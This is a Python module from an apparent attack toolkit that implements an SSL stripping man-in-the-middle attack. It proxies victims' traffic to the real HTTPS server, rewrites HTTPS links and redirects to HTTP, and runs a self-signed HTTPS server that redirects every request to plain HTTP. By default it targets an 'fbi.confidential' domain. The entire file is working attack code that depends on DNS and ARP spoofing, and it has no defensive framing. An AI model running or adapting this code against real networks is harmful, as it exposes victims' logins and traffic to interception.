"""
src/attacks/ssl_strip.py: Module for SSL stripping attack.
Performs MITM downgrade from HTTPS to HTTP by proxying requests and rewriting links.
Assumes DNS spoofing points the domain to the attacker, and ARP spoofing is active for full MITM.
Proxies HTTP requests to the real HTTPS server, rewriting HTTPS links to HTTP.
Handles initial HTTPS requests by redirecting to HTTP (requires self-signed cert; victim may see warning).
"""

import threading
import http.server
import ssl
import requests
from urllib.parse import urlparse

class RedirectHandler(http.server.BaseHTTPRequestHandler):
    """
    Simple handler for HTTPS server to redirect all requests to HTTP.
    """

    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', f"http://{self.server.domain}{self.path}")
        self.end_headers()

    def do_POST(self):
        self.do_GET()  

    def do_HEAD(self):
        self.do_GET()

    def log_message(self, format, *args):
        pass  # Suppress logging

class SSLStripHandler(http.server.BaseHTTPRequestHandler):
    """
    HTTP proxy handler that fetches from real HTTPS server and rewrites content.
    """

    def _proxy_request(self, method, post_data=None):
        real_url = f"https://{self.server.real_ip}{self.path}"
        headers = {k: v for k, v in self.headers.items() if k.lower() != 'host'}

        try:
            if method == 'GET':
                response = requests.get(real_url, headers=headers, verify=False)
            elif method == 'POST':
                response = requests.post(real_url, data=post_data, headers=headers, verify=False)
            else:
                self.send_error(405, "Method Not Allowed")
                return

            content = response.content
            content_type = response.headers.get('Content-Type', '')

            if 'text/html' in content_type:
                try:
                    content_str = content.decode('utf-8')
                    # Rewrite https://domain/* to http://domain/*
                    content_str = content_str.replace(
                        f'https://{self.server.domain}',
                        f'http://{self.server.domain}'
                    )
                    content = content_str.encode('utf-8')
                except UnicodeDecodeError:
                    pass  # Pass through if decoding fails

            self.send_response(response.status_code)

            for header, value in response.headers.items():
                lower_header = header.lower()
                if lower_header == 'location':
                    # Rewrite redirect locations
                    if value.startswith(f'https://{self.server.domain}'):
                        value = value.replace(
                            f'https://{self.server.domain}',
                            f'http://{self.server.domain}',
                            1
                        )
                if lower_header not in ['content-encoding', 'content-length', 'transfer-encoding']:
                    self.send_header(header, value)

            self.send_header('Content-Length', len(content))
            self.end_headers()
            self.wfile.write(content)

        except Exception as e:
            print(f"[ERROR] Proxy error: {e}")
            self.send_error(500, str(e))

    def do_GET(self):
        self._proxy_request('GET')

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length else None
        self._proxy_request('POST', post_data)

    def do_HEAD(self):
        self._proxy_request('GET')  # HEAD similar to GET without body

    def log_message(self, format, *args):
        pass  # Suppress logging

class SSLStripAttack(threading.Thread):
    """
    Manages the SSL stripping attack with HTTP proxy and HTTPS redirect servers.
    """

    def __init__(self, domain: str, real_ip: str, http_port: int = 80, https_port: int = 443):
        super().__init__()
        self.domain = domain
        self.real_ip = real_ip
        self.http_port = http_port
        self.https_port = https_port
        self._stop_event = threading.Event()
        self.daemon = True

    def run(self):
        print("[INFO] SSL Stripping attack started.")

        def run_http_server():
            try:
                server = http.server.HTTPServer(('', self.http_port), SSLStripHandler)
                server.real_ip = self.real_ip
                server.domain = self.domain
                server.timeout = 0.5
                print(f"[INFO] HTTP proxy running on port {self.http_port}")
                while not self._stop_event.is_set():
                    server.handle_request()
                server.server_close()
            except Exception as e:
                print(f"[ERROR] HTTP server error: {e}")

        def run_https_server():
            try:
                server = http.server.HTTPServer(('', self.https_port), RedirectHandler)
                server.socket = ssl.wrap_socket(
                    server.socket,
                    keyfile="fbi.key",
                    certfile="fbi.crt",
                    server_side=True
                )
                server.domain = self.domain
                server.timeout = 0.5
                print(f"[INFO] HTTPS redirect running on port {self.https_port}")
                while not self._stop_event.is_set():
                    server.handle_request()
                server.server_close()
            except Exception as e:
                print(f"[ERROR] HTTPS server error: {e}")

        http_thread = threading.Thread(target=run_http_server)
        https_thread = threading.Thread(target=run_https_server)

        http_thread.start()
        https_thread.start()

        http_thread.join()
        https_thread.join()

        print("[INFO] SSL Stripping attack finished.")

    def stop(self):
        print("[INFO] Signaling SSL Stripping to stop...")
        self._stop_event.set()

def start_sslstrip(domain: str = "fbi.confidential", real_ip: str = "10.0.0.53"):
    """
    Entry point to start the SSL stripping attack.
    """
    try:
        attack = SSLStripAttack(domain, real_ip)
        attack.start()
        return attack
    except Exception as e:
        print(f"[CRITICAL ERROR] Failed to start SSLStripAttack: {e}")
        return None

# For direct testing
if __name__ == "__main__":
    print("Testing SSL strip (requires DNS spoofing and cert files)...")
    try:
        attack = start_sslstrip()
        print("Attack started. Press Ctrl+C to stop.")
        while True:
            pass
    except KeyboardInterrupt:
        print("\nStopping attack...")
        attack.stop()
        attack.join()
        print("Attack stopped.")
